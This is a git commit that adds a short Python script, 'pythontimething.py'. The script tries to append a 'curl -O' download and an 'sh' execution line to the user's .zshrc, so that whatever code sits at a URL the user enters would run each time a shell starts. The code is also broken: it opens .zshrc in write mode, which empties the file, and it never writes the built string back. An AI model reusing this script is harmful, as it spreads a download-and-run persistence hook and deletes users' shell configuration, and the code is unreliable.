b160a9fc651c9a535bebfdf568abc297bcb09acd
furbyboom <115577747+furbyboom@users.noreply.github.com>
2022-10-13 15:24:19 -0700

    Add files via upload

---
+++ pythontimething.py
@@ -0,0 +1,11 @@
+file_ = open(".zshrc")
+_file = open(".zshrc", "w")
+def read_wright(a, b):
+    if a == True:
+        return file_.read()
+    _file.write(b)
+    return file_.read()
+data = read_wright(1, "")
+data = data + "\n curl -O '" + input("url to extension") + "'"
+data = data + "sh " + input("name of extension")
+exit()
